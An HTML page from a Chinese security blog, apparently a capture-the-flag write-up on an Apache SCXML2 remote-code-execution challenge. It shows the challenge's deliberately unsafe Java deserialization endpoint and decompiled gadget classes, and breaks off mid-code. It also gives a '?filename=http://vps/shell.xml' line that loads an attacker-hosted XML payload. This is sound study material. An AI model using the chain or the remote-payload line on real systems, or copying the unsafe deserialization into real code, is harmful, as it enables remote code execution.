@@ -1,0 +1,714 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    BaseCTF一道JAVA题-SCXMl |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  前置知识 Apache SCXML2 RCE漏洞-CSDN博客 通过SCXML scxml &#x3D; SCXMLReader.read(filename);来读取恶意XMl文件 然后 123456&#x2F;&#x2F; 初始化执行器SCXMLExecutor executor &#x3D; new SCXMLExecutor();&#x2F;&#x2F;设置状态机executor.setStateMachine(scxml);&#x2F;&#x2F; 启动">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BaseCTF一道JAVA题-SCXMl">
+<meta property="og:url" content="http://example.com/2025/10/07/BaseCTF%E4%B8%80%E9%81%93JAVA%E9%A2%98-SCXMl/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  前置知识 Apache SCXML2 RCE漏洞-CSDN博客 通过SCXML scxml &#x3D; SCXMLReader.read(filename);来读取恶意XMl文件 然后 123456&#x2F;&#x2F; 初始化执行器SCXMLExecutor executor &#x3D; new SCXMLExecutor();&#x2F;&#x2F;设置状态机executor.setStateMachine(scxml);&#x2F;&#x2F; 启动">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-07T09:10:20.000Z">
+<meta property="article:modified_time" content="2025-12-16T16:25:41.856Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="SCXML2 RCE">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="BaseCTF一道JAVA题-SCXMl">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">BaseCTF一道JAVA题-SCXMl</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text"> 题解</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-BaseCTF一道JAVA题-SCXMl" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/07/BaseCTF%E4%B8%80%E9%81%93JAVA%E9%A2%98-SCXMl/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-07T09:10:20.000Z" itemprop="datePublished">2025-10-07</time>
+    <time style="display: none;" id="post-update-time">2025-12-17</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134451789">Apache SCXML2 RCE漏洞-CSDN博客</a></p>
+<p>通过<code>SCXML scxml = SCXMLReader.read(filename);</code>来读取恶意XMl文件</p>
+<p>然后</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化执行器</span></span><br><span class="line"><span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line"><span class="comment">//设置状态机</span></span><br><span class="line">executor.setStateMachine(scxml);</span><br><span class="line"><span class="comment">// 启动状态机执行</span></span><br><span class="line">executor.go();</span><br></pre></td></tr></table></figure>
+<p>构造XML-payload看上述博客</p>
+<p>可以通过访问外部恶意XML文件导致RCE：<code>?filename=http://vps/shell.xml</code></p>
+<h2 id="题解"><a class="markdownIt-Anchor" href="#题解"></a> 题解</h2>
+<p>有个Main.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(System.getenv().getOrDefault(<span class="string">&quot;PORT&quot;</span>, <span class="string">&quot;8000&quot;</span>));</span><br><span class="line">        <span class="type">var</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">java</span>.net.InetSocketAddress(port), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, req -&gt; &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">code</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">            <span class="type">var</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">switch</span> (req.getRequestURI().getPath()) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;/scxml&quot;</span> -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">var</span> <span class="variable">param</span> <span class="operator">=</span> req.getRequestURI().getQuery();</span><br><span class="line">                        <span class="keyword">yield</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        <span class="keyword">yield</span> <span class="string">&quot;:(&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">                    code = <span class="number">404</span>;</span><br><span class="line">                    <span class="keyword">yield</span> <span class="string">&quot;Not found&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            req.sendResponseHeaders(code, <span class="number">0</span>);</span><br><span class="line">            <span class="type">var</span> <span class="variable">os</span> <span class="operator">=</span> req.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;);</span><br><span class="line">        server.start();</span><br><span class="line">        System.out.printf(<span class="string">&quot;Server listening on :%s\n&quot;</span>, port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在/scxml路由下对查询的参数进行了Base64解密，并在反序列化后执行了toString方法</p>
+<p>n1ght.jar包下有一个InvokerImpl.java，实现了序列化接口，还有toString类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.invoke.Invoker;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.invoke.InvokerException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerImpl</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Invoker o;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String source;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map params;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerImpl</span><span class="params">(Invoker o, String source, Map params)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.o = o;</span><br><span class="line">        <span class="built_in">this</span>.source = source;</span><br><span class="line">        <span class="built_in">this</span>.params = params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.o.invoke(<span class="built_in">this</span>.source, <span class="built_in">this</span>.params);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success invoke&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvokerException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那就是把InvokerImpl类作为入口类了</p>
+<p>反序列化InvokerImpl类后调用它的toString方法</p>
+<p>再看到<code>SimpleSCXMLInvoker#invoke</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.commons.scxml2.invoke;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.Evaluator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCInstance;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.TriggerEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.SimpleDispatcher;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.SimpleErrorReporter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.SimpleSCXMLListener;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleSCXMLInvoker</span> <span class="keyword">implements</span> <span class="title class_">Invoker</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String parentStateId;</span><br><span class="line">    <span class="keyword">private</span> String eventPrefix;</span><br><span class="line">    <span class="keyword">private</span> SCInstance parentSCInstance;</span><br><span class="line">    <span class="keyword">private</span> SCXMLExecutor executor;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> cancelled;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokePrefix</span> <span class="operator">=</span> <span class="string">&quot;.invoke.&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokeDone</span> <span class="operator">=</span> <span class="string">&quot;done&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokeCancelResponse</span> <span class="operator">=</span> <span class="string">&quot;cancel.response&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParentStateId</span><span class="params">(String parentStateId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parentStateId = parentStateId;</span><br><span class="line">        <span class="built_in">this</span>.eventPrefix = <span class="built_in">this</span>.parentStateId + invokePrefix;</span><br><span class="line">        <span class="built_in">this</span>.cancelled = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSCInstance</span><span class="params">(SCInstance scInstance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parentSCInstance = scInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String source, Map&lt;String, Object&gt; params)</span> <span class="keyword">throws</span> InvokerException &#123;</span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            scxml = SCXMLReader.read(<span class="keyword">new</span> <span class="title class_">URL</span>(source));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelException me) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(me.getMessage(), me.getCause());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(ioe.getMessage(), ioe.getCause());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XMLStreamException xse) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(xse.getMessage(), xse.getCause());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Evaluator</span> <span class="variable">eval</span> <span class="operator">=</span> <span class="built_in">this</span>.parentSCInstance.getEvaluator();</span><br><span class="line">        <span class="built_in">this</span>.executor = <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>(eval, <span class="keyword">new</span> <span class="title class_">SimpleDispatcher</span>(), <span class="keyword">new</span> <span class="title class_">SimpleErrorReporter</span>());</span><br><span class="line">        <span class="type">Context</span> <span class="variable">rootCtx</span> <span class="operator">=</span> eval.newContext((Context)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String, Object&gt; entry : params.entrySet()) &#123;</span><br><span class="line">            rootCtx.setLocal((String)entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.executor.setRootContext(rootCtx);</span><br><span class="line">        <span class="built_in">this</span>.executor.setStateMachine(scxml);</span><br><span class="line">        <span class="built_in">this</span>.executor.addListener(scxml, <span class="keyword">new</span> <span class="title class_">SimpleSCXMLListener</span>());</span><br><span class="line">        <span class="built_in">this</span>.executor.registerInvokerClass(<span class="string">&quot;scxml&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.executor.go();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelException me) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(me.getMessage(), me.getCause());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.executor.getCurrentStatus().isFinal()) &#123;</span><br><span class="line">            <span class="type">TriggerEvent</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TriggerEvent</span>(<span class="built_in">this</span>.eventPrefix + invokeDone, <span class="number">3</span>);</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">AsyncTrigger</span>(<span class="built_in">this</span>.parentSCInstance.getExecutor(), te)).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parentEvents</span><span class="params">(TriggerEvent[] evts)</span> <span class="keyword">throws</span> InvokerException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.cancelled) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">doneBefore</span> <span class="operator">=</span> <span class="built_in">this</span>.executor.getCurrentStatus().isFinal();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.executor.triggerEvents(evts);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ModelException me) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(me.getMessage(), me.getCause());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!doneBefore &amp;&amp; <span class="built_in">this</span>.executor.getCurrentStatus().isFinal()) &#123;</span><br><span class="line">                <span class="type">TriggerEvent</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TriggerEvent</span>(<span class="built_in">this</span>.eventPrefix + invokeDone, <span class="number">3</span>);</span><br><span 